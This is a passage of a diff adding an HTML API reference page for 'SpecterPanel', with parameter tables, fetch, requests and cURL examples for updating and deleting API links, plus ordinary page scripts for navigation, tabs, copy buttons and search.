+        <pre id="view_api_link_delete-py" class="code" style="display:none"># Python (requests) - using session with cookies
+try:
+    response = session.get(
+        'http://SERVER/api_link_delete/link123'
+    )
+    print("Server response:", response.json())
+except Exception as e:
+    print("Error:", e)</pre>
+
+        <pre id="view_api_link_delete-curl" class="code" style="display:none"># cURL - requires session cookie
+curl -b cookies.txt "http://SERVER/api_link_delete/link123"</pre>
+      </section>
+
+      <section id="view_api_link_update">
+        <div class="meta">
+          <span class="method-badge">POST</span>
+          <h2 class="endpoint-path">/api_link_update/&lt;ID&gt;</h2>
+        </div>
+        
+        <div class="endpoint-summary">
+          <p>Update an existing API link. Expects form data with the updated fields.</p>
+          <p class="hint"><strong>Note:</strong> Requires valid session authentication (web login).</p>
+        </div>
+        
+        <h3>Parameters (POST Form)</h3>
+        <table>
+          <tr><th>Name</th><th>Type</th><th>Required</th><th>Description</th></tr>
+          <tr>
+            <td>target_name</td>
+            <td>string</td>
+            <td><span class="required">*</span></td>
+            <td>Target associated with the API link</td>
+          </tr>
+          <tr>
+            <td>link</td>
+            <td>string</td>
+            <td><span class="required">*</span></td>
+            <td>Updated URL or endpoint</td>
+          </tr>
+          <tr>
+            <td>action_type</td>
+            <td>string</td>
+            <td><span class="required">*</span></td>
+            <td>Updated HTTP method</td>
+          </tr>
+          <tr>
+            <td>ID</td>
+            <td>string</td>
+            <td>path</td>
+            <td><span class="required">*</span></td>
+            <td>ID of the API link to update</td>
+          </tr>
+        </table>
+
+        <h3>Examples</h3>
+        <div class="code-toolbar">
+          <div class="tabs">
+            <button class="tab-btn active" data-target="view_api_link_update-js">JavaScript</button>
+            <button class="tab-btn" data-target="view_api_link_update-py">Python</button>
+            <button class="tab-btn" data-target="view_api_link_update-curl">cURL</button>
+          </div>
+          <button class="copy-btn" data-copy-target="view_api_link_update-js">
+            <svg viewBox="0 0 24 24" width="14" height="14">
+              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+            </svg>
+            Copy
+          </button>
+        </div>
+
+        <pre id="view_api_link_update-js" class="code">// JavaScript (fetch) - Form POST
+const formData = new FormData();
+formData.append('target_name', 'demo_target');
+formData.append('link', 'http://updated.com/api');
+formData.append('action_type', 'POST');
+
+fetch('/api_link_update/link123', {
+  method: 'POST',
+  credentials: 'include',
+  body: formData
+})
+.then(() => {
+  console.log('API link updated');
+  // Typically would refresh the page or update UI
+})
+.catch(error => console.error('Error:', error));</pre>
+
+        <pre id="view_api_link_update-py" class="code" style="display:none"># Python (requests) - Form POST
+form_data = {
+    'target_name': 'demo_target',
+    'link': 'http://updated.com/api',
+    'action_type': 'POST'
+}
+
+try:
+    response = session.post(
+        'http://SERVER/api_link_update/link123',
+        data=form_data
+    )
+    print("API link updated")
+except Exception as e:
+    print("Error:", e)</pre>
+
+        <pre id="view_api_link_update-curl" class="code" style="display:none"># cURL - Form POST
+curl -b cookies.txt -X POST "http://SERVER/api_link_update/link123" \
+  -F "target_name=demo_target" \
+  -F "link=http://updated.com/api" \
+  -F "action_type=POST"</pre>
+      </section>
+
+      <footer style="color:var(--muted);font-size:14px;margin-top:40px;padding-top:20px;border-top:1px solid var(--glass-border); text-align: center;">
+        <p>Generated for <strong style="color: var(--accent);">SpecterPanel</strong>. Replace <code>SERVER</code> with your server's base URL (e.g., <code>https://panel.example.com</code>).</p>
+        <p class="hint">Always handle API tokens securely and never expose them in client-side code.</p>
+      </footer>
+    </main>
+  </div>
+  
+  <button class="scroll-top" id="scrollTopBtn" aria-label="Scroll to top">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M7 11L12 6L17 11M7 17L12 12L17 17" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </button>
+
+  <script>
+    // Particle background
+    function createParticles() {
+      const particles = document.getElementById('particles');
+      const particleCount = 20;
+      
+      for (let i = 0; i < particleCount; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        
+        const size = Math.random() * 4 + 1;
+        const posX = Math.random() * 100;
+        const delay = Math.random() * 20;
+        const duration = Math.random() * 20 + 20;
+        
+        particle.style.width = `${size}px`;
+        particle.style.height = `${size}px`;
+        particle.style.left = `${posX}%`;
+        particle.style.animationDelay = `${delay}s`;
+        particle.style.animationDuration = `${duration}s`;
+        particle.style.opacity = Math.random() * 0.1 + 0.05;
+        
+        particles.appendChild(particle);
+      }
+    }
+    
+    // Mobile navigation functionality
+    const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+    const navCloseBtn = document.getElementById('navCloseBtn');
+    const sidebar = document.getElementById('sidebar');
+    const navOverlay = document.getElementById('navOverlay');
+    
+    function openMobileNav() {
+      sidebar.classList.add('open');
+      navOverlay.classList.add('active');
+      mobileMenuBtn.classList.add('open');
+      document.body.style.overflow = 'hidden'; // Prevent background scrolling
+    }
+    
+    function closeMobileNav() {
+      sidebar.classList.remove('open');
+      navOverlay.classList.remove('active');
+      mobileMenuBtn.classList.remove('open');
+      document.body.style.overflow = ''; // Restore scrolling
+    }
+    
+    // Toggle mobile menu
+    mobileMenuBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      if (sidebar.classList.contains('open')) {
+        closeMobileNav();
+      } else {
+        openMobileNav();
+      }
+    });
+    
+    // Close mobile menu when close button is clicked
+    navCloseBtn.addEventListener('click', closeMobileNav);
+    
+    // Close mobile menu when overlay is clicked
+    navOverlay.addEventListener('click', closeMobileNav);
+    
+    // Close mobile menu when a nav link is clicked
+    document.querySelectorAll('.nav-link').forEach(link => {
+      link.addEventListener('click', () => {
+        if (window.innerWidth <= 900) {
+          closeMobileNav();
+        }
+      });
+    });
+    
+    // Close mobile menu when clicking outside on mobile
+    document.addEventListener('click', (e) => {
+      if (window.innerWidth <= 900 && 
+          sidebar.classList.contains('open') && 
+          !sidebar.contains(e.target) && 
+          e.target !== mobileMenuBtn) {
+        closeMobileNav();
+      }
+    });
+    
+    // Close mobile menu on escape key
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && sidebar.classList.contains('open')) {
+        closeMobileNav();
+      }
+    });
+    
+    // Close mobile menu on window resize if it becomes larger
+    window.addEventListener('resize', () => {
+      if (window.innerWidth > 900 && sidebar.classList.contains('open')) {
+        closeMobileNav();
+      }
+    });
+    
+    // Scroll to top button
+    const scrollTopBtn = document.getElementById('scrollTopBtn');
+    
+    window.addEventListener('scroll', () => {
+      if (window.pageYOffset > 300) {
+        scrollTopBtn.classList.add('visible');
+      } else {
+        scrollTopBtn.classList.remove('visible');
+      }
+    });
+    
+    scrollTopBtn.addEventListener('click', () => {
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    });
+    
+    // Tab switching
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const parent = btn.closest('section');
+        const target = btn.dataset.target;
+        
+        // Deactivate sibling buttons in same section
+        parent.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        
+        // Hide all code blocks in section, then show the selected one
+        parent.querySelectorAll('pre.code').forEach(pre => pre.style.display = 'none');
+        const el = parent.querySelector('#' + target);
+        if (el) el.style.display = 'block';
+      });
+    });
+    
+    // Copy button functionality
+    document.querySelectorAll('.copy-btn').forEach(cb => {
+      cb.addEventListener('click', () => {
+        const targetId = cb.dataset.copyTarget;
+        const el = document.getElementById(targetId);
+        if (!el) return;
+        
+        navigator.clipboard.writeText(el.innerText).then(() => {
+          const originalText = cb.innerHTML;
+          cb.innerHTML = '<svg viewBox="0 0 24 24" width="14" height="14"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z" fill="currentColor"/></svg> Copied!';
+          
+          setTimeout(() => {
+            cb.innerHTML = originalText;
+          }, 2000);
+        }).catch(() => {
+          alert('Copy failed. Please try again or copy manually.');
+        });
+      });
+    });
+    
+    // Search functionality
+    const searchInput = document.getElementById('searchInput');
+    const navLinks = document.querySelectorAll('.nav-link');
+    
+    searchInput.addEventListener('input', (e) => {
+      const searchTerm = e.target.value.toLowerCase();
+      
+      navLinks.forEach(link => {
+        const text = link.textContent.toLowerCase();
+        if (text.includes(searchTerm)) {
+          link.style.display = 'block';
+        } else {
+          link.style.display = 'none';
+        }
+      });
+    });
+    
+    // Highlight active nav link based on scroll position
+    const sections = document.querySelectorAll('section');
+    const navLinksArray = Array.from(document.querySelectorAll('.nav-link'));
+    
+    window.addEventListener('scroll', () => {
+      let current = '';
+      
+      sections.forEach(section => {
+        const sectionTop = section.offsetTop;
+        const sectionHeight = section.clientHeight;
+        
+        if (pageYOffset >= sectionTop - 100) {
+          current = section.getAttribute('id');
+        }
+      });
+      
+      navLinksArray.forEach(link => {
+        link.classList.remove('active');
+        if (link.getAttribute('href') === `#${current}`) {
+          link.classList.add('active');
+        }
+      });
+    });
+
+    // Smooth scrolling for anchor links
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+      anchor.addEventListener('click', function(e) {
+        e.preventDefault();
+        
+        const targetId = this.getAttribute('href');
+        const targetElement = document.querySelector(targetId);
+        
+        if (targetElement) {
+          window.scrollTo({
+            top: targetElement.offsetTop - 80,
+            behavior: 'smooth'
+          });
+          
+          // Update URL without jumping
+          if (history.pushState) {
+            history.pushState(null, null, targetId);
+          } else {
+            location.hash = targetId;
+          }
+        }
+      });
+    });
+    
+    // Initialize particles
+    createParticles();
+  </script>
+</body>
+</html>
